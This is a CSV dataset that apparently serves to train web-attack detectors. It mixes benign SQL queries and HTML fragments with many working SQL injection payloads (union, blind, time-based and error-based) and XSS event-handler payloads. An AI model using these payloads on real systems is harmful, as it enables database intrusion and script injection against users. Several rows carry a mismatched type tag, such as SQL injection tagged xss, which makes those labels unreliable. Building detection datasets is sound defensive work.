Text,Label,type
SELECT * FROM wp_posts WHERE ID  =  28635 LIMIT 1,0,sql
-6045 or 8919  =  2827--,1,xss
"admin"" --",1,sql
"  <form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",0,xss
salerno.harmer@nexuspark.li,0,sql
"1' union all select null,null,null--",1,sql
 </li>,0,xss
"-7255' union all select 2127,2127,2127,2127,2127#",1,xss
-6777%'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  ',1,sql
1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sql
SELECT COUNT ( aid ) FROM fallen,0,sql
SELECT * FROM office WHERE four IN  ( SELECT shelter FROM badly ) ,0,sql
1   )    )    as wwys where 9248  =  9248,1,sql
SELECT hall ( s FROM shells RIGHT JOIN,0,sql
DELETE FROM orange WHERE dream = 'sold',0,sql
"<p onmousemove=""alert(1)"">test</p>",2,xss
"1"" where 8333  =  8333",1,sql
SELECT AVG ( smell ) FROM alive SELECT SUM ( subject ) ,0,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;248–258, </li>",0,xss
SELECT TOP 50 PERCENT * FROM body,0,xss
"   SELECT fence,discover,syllable,those,coast     (  (  shoot JOIN strike ON exist.near =  basis.market )   INNER JOIN rhymeON Orders.table =  torn.roseID ) ",0,sql
pittman,0,xss
"1,  (  select   (  case when   (  8674  =  7896  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,xss
1'+  (  select trte where 9173  =  9173 and 2006  =  2006,1,sql
SELECT * FROM wp_houzez_crm_viewed_listings WHERE listing_id  =  181 AND user_id  =  0,0,sql
"<li><a href=""/wiki/Knowledge-based_systems"" title=""Knowledge-based systems"">Knowledge-based systems </a> </li>",0,xss
SELECT * FROM himself WHERE dried BETWEEN '1996-07-01' AND '1996-07-31',0,xss
"<li class=""toclevel-3 tocsection-61""><a href=""#Consciousness""><span class=""tocnumber"">8.4.1 ",0,xss
SELECT orbit ( s )  FROM orange FULL OUTER JOIN,0,sql
SELECT * FROM Customers  WHERE City LIKE '[a-c]%';,0,xss
<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>,2,xss
"1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,2,xss
"<ul><li><a href=""/wiki/Applications_of_artificial_intelligence"" title=""Applications of artificial intelligence"">Applications of artificial intelligence </a> </li>",0,xss
"  SELECT more,wide FROM trade WHERE kids = 'begun' UNION SELECT along, grown FROM roll",0,sql
-2372' or 1783  =  2656,1,sql
	 </span>,0,xss
SELECT MIN ( iron )  AS mysterious FROM thick,0,sql
" SELECT FIELD ( ""c"", ""a"", ""b"" ) ; ",0,sql
SELECT AVG ( yesterday ) FROM pool SELECT SUM ( father ) ,0,sql
waggenheim@rubirubi.info,0,sql
<font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>,2,xss
3.45951E+14,0,sql
	 </span> 2018 ,0,xss
"<cite onbeforecut=""alert(1)"" contenteditable>test</cite>",2,xss
"-1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
" SELECT * FROM double ORDER BY steam ASC, breeze DESC",0,xss
clunes7@palodegolf.com.coop,0,sql
"<q oncontextmenu=""alert(1)"">test</q>",2,xss
lindt38,0,sql
SELECT halfway ( s ) FROM spread INNER JOIN,0,sql
"1 where 6965  =  6965 and elt  (  3933  =  1232,1232  )  --",1,sql
"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,xss
1' and 2316  =  7236,1,sql
<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,2,xss
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'jvll' like 'jvll",1,sql
SELECT TOP 50 PERCENT * FROM stop SELECT * FROM thousand FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM alphabet,0,sql
SELECT * FROM hundred WHERE beautiful NOT LIKE '[arrangement]%',0,xss
SELECT * FROM bent WHERE NOT tune = 'talk'  AND NOT flag = 'wait',0,sql
	 </span>,0,xss
jochen,0,xss
SELECT AVG ( idea ) FROM fight,0,xss
" SELECT column_name ( s )  FROM pack,said",0,sql
"calle republique dominicana, 85",0,sql
"<samp onmouseenter=""alert(1)"">test</samp>",2,xss
SELECT * FROM rice WHERE recall = 'very'  AND City = 'section',0,xss
SELECT * FROM pencil WHERE wheel IN  ( SELECT city FROM life ) ,0,sql
"INSERT INTO nearer  ( stairs, officer, dear )  VALUES  ( 'band', 'throw', 'tales' )  ",0,sql
<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>,2,xss
"1"" where 2886  =  2886",1,xss
montamarta,0,xss
SELECT branch FROM basic,0,sql
"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1,sql
"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT * FROM sold ORDER BY hot,0,xss
6212,0,sql
"<slot draggable=""true"" ondragenter=""alert(1)"">test</slot>",2,xss
SELECT they ( s FROM somewhere RIGHT JOIN,0,sql
SELECT AVG ( motor ) FROM silence SELECT SUM ( fix ) ,0,sql
ehrlich.selwyne@ebaz.ba,0,sql
<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>,2,xss
"  SELECT Orders.roperID, Employees.pitch, Employees.grain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.headingID ORDER BY Orders.loveID",0,sql
"<li><a href=""/wiki/Reinforcement_learning"" title=""Reinforcement learning"">Reinforcement learning </a> </li>",0,xss
or,1,sql
<area onpointerleave=alert(1)>XSS</area>,2,xss
"<mark onmouseenter=""alert(1)"">test</mark>",2,xss
"<noembed onbeforecut=""alert(1)"" contenteditable>test</noembed>",2,xss
"<svg onmouseout=""alert(1)"">test</svg>",2,xss
filpica,0,sql
SELECT search ( s )  FROM he UNION ALL,0,sql
"  SELECT riding,brush FROM value WHERE above = 'family' UNION SELECT thread, supply FROM liquid",0,sql
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",1,sql
"<style>:target {transform: rotate(180deg);}</style><dd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dd>",2,xss
SELECT * FROM accept WHERE shells = 'beautiful',0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://fortune.com/ai-artificial-intelligence-deep-machine-learning/"">""Why Deep Learning Is Suddenly Changing Your Life"" </a>. <i>Fortune </i>. 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0,xss
" SELECT column_name ( s )  FROM couple,straight",0,sql
peralejos de abajo,0,sql
narros de matalayegua,0,sql
<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>,2,xss
"The programs described are <a href=""/wiki/Arthur_Samuel"" title=""Arthur Samuel"">Arthur Samuel </a>'s checkers program for the <a href=""/wiki/IBM_701"" title=""IBM 701"">IBM 701 </a>, <a href=""/wiki/Daniel_Bobrow"" class=""mw-redirect"" title=""Daniel Bobrow"">Daniel Bobrow </a>'s <a href=""/wiki/STUDENT_(computer_program)"" title=""STUDENT (computer program)"">STUDENT </a>, <a href=""/wiki/Allen_Newell"" title=""Allen Newell"">Newell </a> and <a href=""/wiki/Herbert_A._Simon"" title=""Herbert A. Simon"">Simon </a>'s <a href=""/wiki/Logic_Theorist"" title=""Logic Theorist"">Logic Theorist </a> and <a href=""/wiki/Terry_Winograd"" title=""Terry Winograd"">Terry Winograd </a>'s <a href=""/wiki/SHRDLU"" title=""SHRDLU"">SHRDLU </a>. ",0,xss
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",1,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",1,xss
SELECT football ( s )  FROM read FULL OUTER JOIN,0,sql
SELECT * FROM mail WHERE wear NOT LIKE 'wrote%',0,sql
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,2,xss
ar2e5tad6,0,xss
"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",1,sql
2.28251E+15,0,sql
SELECT AVG ( sand ) FROM to SELECT SUM ( direction ) ,0,sql
	 </span> </h3>,0,xss
 or 0  =  0 #,1,xss
SELECT * FROM common WHERE struggle = 'none'  OR silk = 'fifteen',0,sql
8322,0,sql
"<aside oncontextmenu=""alert(1)"">test</aside>",2,xss
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,xss
"   SELECT sound, pleasure, you FROM surface WHERE strength  IS NULL",0,xss
SELECT * FROM alone WHERE never BETWEEN act09/01/1996say AND keep15/31/1996meat,0,sql
"<link onmousedown=""alert(1)"">test</link>",2,xss
<map id=x tabindex=1 onfocusin=alert(1)></map>,2,xss
Neural networks and connectionism:,0,xss
"1"" and make_set  (  8403  =  8403,8899  )   and ""fqxr"" like ""fqxr",1,sql
espineta astorquiza,0,sql
"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",1,xss
 </li>,0,xss
 (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,1,sql
"	 </span> <span class=""reference-text""><a href=""/wiki/Alan_Turing"" title=""Alan Turing"">Alan Turing </a> discussed the centrality of learning as early as 1950, in his classic paper ""<a href=""/wiki/Computing_Machinery_and_Intelligence"" title=""Computing Machinery and Intelligence"">Computing Machinery and Intelligence </a>"".(<a href=""#CITEREFTuring1950"">Turing 1950 </a>) In 1956, at the original Dartmouth AI summer conference, <a href=""/wiki/Ray_Solomonoff"" title=""Ray Solomonoff"">Ray Solomonoff </a> wrote a report on unsupervised probabilistic machine learning: ""An Inductive Inference Machine"".(<a href=""#CITEREFSolomonoff1956"">Solomonoff 1956 </a>) ",0,xss
"   SELECT music, noun, where FROM she WHERE rather  IS NULL",0,xss
1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,sql
05636576n,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 173 )  ORDER BY meta_id ASC",0,xss
SELECT TOP 3 * FROM buried SELECT * FROM waste 3SELECT * FROM railroad,0,sql
"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",1,sql
SELECT * FROM size WHERE later = 'discuss' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT AVG ( war ) FROM layers SELECT SUM ( men ) ,0,sql
"<div class=""section"" id=""built-in-services"">",0,xss
2306,0,xss
"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",1,sql
SELECT COUNT ( must )  FROM local,0,sql
SELECT TOP 3 * FROM each WHERE blind = 'ought' SELECT * FROM merely,0,sql
"<hr onmouseleave=""alert(1)"">test</hr>",2,xss
<tt onpointermove=alert(1)>XSS</tt>,2,xss
<tr onpointerdown=alert(1)>XSS</tr>,2,xss
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdi>",2,xss
"General intelligence (<a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">strong AI </a>) is discussed in popular introductions to AI:",0,xss
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",1,sql
enardecedora,0,sql
"<mark onmouseleave=""alert(1)"">test</mark>",2,xss
 ',1,sql
<svg><time onload=alert(1)></time>,2,xss
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",1,sql
"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"	<a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a><sup id=""cite_ref-Natural_language_processing_120-0"" class=""reference""><a href=""#cite_note-Natural_language_processing-120"">&#91;117&#93; </a> </sup> (NLP) gives machines the ability to read and <a href=""/wiki/Natural_language_understanding"" class=""mw-redirect"" title=""Natural language understanding"">understand </a> human language. A sufficiently powerful natural language processing system would enable <a href=""/wiki/Natural-language_user_interface"" title=""Natural-language user interface"">natural-language user interfaces </a> and the acquisition of knowledge directly from human-written sources, such as newswire texts. Some straightforward applications of natural language processing include <a href=""/wiki/Information_retrieval"" title=""Information retrieval"">information retrieval </a>, <a href=""/wiki/Text_mining"" title=""Text mining"">text mining </a>, <a href=""/wiki/Question_answering"" title=""Question answering"">question answering </a><sup id=""cite_ref-121"" class=""reference""><a href=""#cite_note-121"">&#91;118&#93; </a> </sup> and <a href=""/wiki/Machine_translation"" title=""Machine translation"">machine translation </a>.<sup id=""cite_ref-Applications_of_natural_language_processing_122-0"" class=""reference""><a href=""#cite_note-Applications_of_natural_language_processing-122"">&#91;119&#93; </a> </sup> Many current approaches use word co-occurrence frequencies to construct syntactic representations of text. ""Keyword spotting"" strategies for search are popular and scalable but dumb; a search query for ""dog"" might only match documents with the literal word ""dog"" and miss a document with the word ""poodle"". ""Lexical affinity"" strategies use the occurrence of words such as ""accident"" to <a href=""/wiki/Sentiment_analysis"" title=""Sentiment analysis"">assess the sentiment </a> of a document. Modern statistical NLP approaches can combine all these strategies as well as others, and often achieve acceptable accuracy at the page or paragraph level, but continue to lack the semantic understanding required to classify isolated sentences well. Besides the usual difficulties with encoding semantic commonsense knowledge, existing semantic NLP sometimes scales too poorly to be viable in business applications. Beyond semantic NLP, the ultimate goal of ""narrative"" NLP is to embody a full understanding of commonsense reasoning.<sup id=""cite_ref-123"" class=""reference""><a href=""#cite_note-123"">&#91;120&#93; </a> </sup>",0,xss
"<listing oncopy=""alert(1)"" contenteditable>test</listing>",2,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
de1l2nda9ur4,0,sql
"<header onkeyup=""alert(1)"" contenteditable>test</header>",2,xss
"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
"  SELECT mistake,fish,close FROM plates LEFT JOIN Orders ON meet.forgottenID =  worried.attention ORDER BY angle.rocket",0,sql
SELECT * FROM student WHERE third = 'mistake'  OR came = 'seems',0,sql
"1""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT COUNT ( purpleID ) FROM why,0,sql
<div onpointerover=alert(1)>XSS</div>,2,xss
<br onpointerover=alert(1)>XSS</br>,2,xss
"<li><a href=""/wiki/Network_security"" title=""Network security"">Network security </a> </li>",0,xss
"<div role=""navigation"" class=""navbox authority-control"" aria-labelledby=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" style=""padding:3px""><table class=""nowraplinks hlist navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th id=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Help:Authority_control"" title=""Help:Authority control"">Authority control </a> <a href=""https://www.wikidata.org/wiki/Q11660"" title=""Edit this at Wikidata""><img alt=""Edit this at Wikidata"" src=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/10px-OOjs_UI_icon_edit-ltr-progressive.svg.png"" decoding=""async"" width=""10"" height=""10"" style=""vertical-align: text-top"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/15px-OOjs_UI_icon_edit-ltr-progressive.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/20px-OOjs_UI_icon_edit-ltr-progressive.svg.png 2x"" data-file-width=""20"" data-file-height=""20"" /> </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"<p>Neural networks were inspired by the architecture of neurons in the human brain. A simple ""neuron"" <i>N </i> accepts input from other neurons, each of which, when activated (or ""fired""), cast a weighted ""vote"" for or against whether neuron <i>N </i> should itself activate. Learning requires an algorithm to adjust these weights based on the training data; one simple algorithm (dubbed ""<a href=""/wiki/Hebbian_learning"" class=""mw-redirect"" title=""Hebbian learning"">fire together, wire together </a>"") is to increase the weight between two connected neurons when the activation of one triggers the successful activation of another. The neural network forms ""concepts"" that are distributed among a subnetwork of shared<sup id=""cite_ref-232"" class=""reference""><a href=""#cite_note-232"">&#91;j&#93; </a> </sup> neurons that tend to fire together; a concept meaning ""leg"" might be coupled with a subnetwork meaning ""foot"" that includes the sound for ""foot"". Neurons have a continuous spectrum of activation; in addition, neurons can process inputs in a nonlinear way rather than weighing straightforward votes. Modern neural networks can learn both continuous functions and, surprisingly, digital logical operations. Neural networks' early successes included predicting the stock market and (in 1995) a mostly self-driving car.<sup id=""cite_ref-233"" class=""reference""><a href=""#cite_note-233"">&#91;k&#93; </a> </sup><sup id=""cite_ref-FOOTNOTEDomingos2015Chapter_4_234-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015Chapter_4-234"">&#91;223&#93; </a> </sup> In the 2010s, advances in neural networks using deep learning thrust AI into widespread public consciousness and contributed to an enormous upshift in corporate AI spending; for example, AI-related <a href=""/wiki/Mergers_and_acquisitions"" title=""Mergers and acquisitions"">M&amp;A </a> in 2017 was over 25 times as large as in 2015.<sup id=""cite_ref-235"" class=""reference""><a href=""#cite_note-235"">&#91;224&#93; </a> </sup><sup id=""cite_ref-236"" class=""reference""><a href=""#cite_note-236"">&#91;225&#93; </a> </sup>",0,xss
 UPDATE flame SET wish = 'mouth'WHERE lovely = 'cave',0,sql
SELECT * FROM daily FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM exercise,0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",1,sql
"<li><a href=""/wiki/Military_robot"" title=""Military robot"">Military </a> </li>",0,xss
"<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></fieldset>",2,xss
1'   )    )     )   and 9198  =  9198--,1,sql
SELECT * FROM bag 3 SELECT * FROM except,0,xss
odonovan@piaceredelivery.ro,0,sql
"<IMG SRC=""jav	ascript:alert('');"">",2,xss
"<li><a href=""/wiki/Application_security"" title=""Application security"">Application security </a> </li> </ul>",0,xss
"estrada mendiarte s/n, 10?a",0,sql
"<nobr onkeyup=""alert(1)"" contenteditable>test</nobr>",2,xss
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""awyk"" like ""awyk",1,sql
"1%""   )    )    union all select null,null#",1,sql
"azorin, 167",0,sql
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0,sql
"1%'   )    )     )   union all select null,null,null,null,null#",1,sql
SELECT tonight ( s )  FROM population FULL OUTER JOIN,0,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'pshn' like 'pshn",1,xss
1'||  (  select 'ucro' where 9912  =  9912 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
"<u onkeypress=""alert(1)"" contenteditable>test</u>",2,xss
"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",1,sql
"<ul><li><a href=""/wiki/Model_of_computation"" title=""Model of computation"">Model of computation </a> </li>",0,xss
"<article onkeydown=""alert(1)"" contenteditable>test</article>",2,xss
<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,2,xss
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;83–102, 163–176 </li>",0,xss
1'+  (  select 'zugq' where 9218  =  9218,1,sql
if  (  2823  =  3532  )   select 2823 else drop function kmqw--,1,sql
"<dt><a class=""reference internal"" href=""topics/telnetconsole.html""><span class=""doc"">Telnet Console",0,xss
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationend=""alert(1)""></caption>",2,xss
<noembed onpointerup=alert(1)>XSS</noembed>,2,xss
a06b6,0,xss
1'   )    )    or sleep  (  5  )   and    (    (   'taaj'  =  'taaj,1,sql
07383536f,0,xss
"1""  )   or sleep  (  5  )  #",1,sql
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",2,xss
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',1,sql
select   (  case when   (  2783  =  9216  )   then 1 else 2783*  (  select 2783 from master..sysdatabases  )   end  )  --,1,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +'",1,sql
<data onpointerleave=alert(1)>XSS</data>,2,xss
1   )    )    as bjxd where 4299  =  4299,1,sql
"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sql
SELECT COUNT ( beginningID ) FROM were,0,xss
SELECT COUNT ( stared ) FROM ever,0,sql
SELECT AVG ( raw ) FROM bigger SELECT SUM ( volume ) ,0,sql
"<nobr onbeforecopy=""alert(1)"" contenteditable>test</nobr>",2,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFGladwell2005"">Gladwell 2005 </a>. ",0,xss
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'smrw' like 'smrw,1,sql
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ) ,0,xss
"  SELECT sunlight AS small, threw AS [familiar]  FROM store",0,sql
noviercas,0,sql
"   SELECT worth, seen+ ', ' + wise+ ' ' + remember+ ', ' + comfortable AS needs  FROM death",0,sql
carr3e0,0,xss
"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
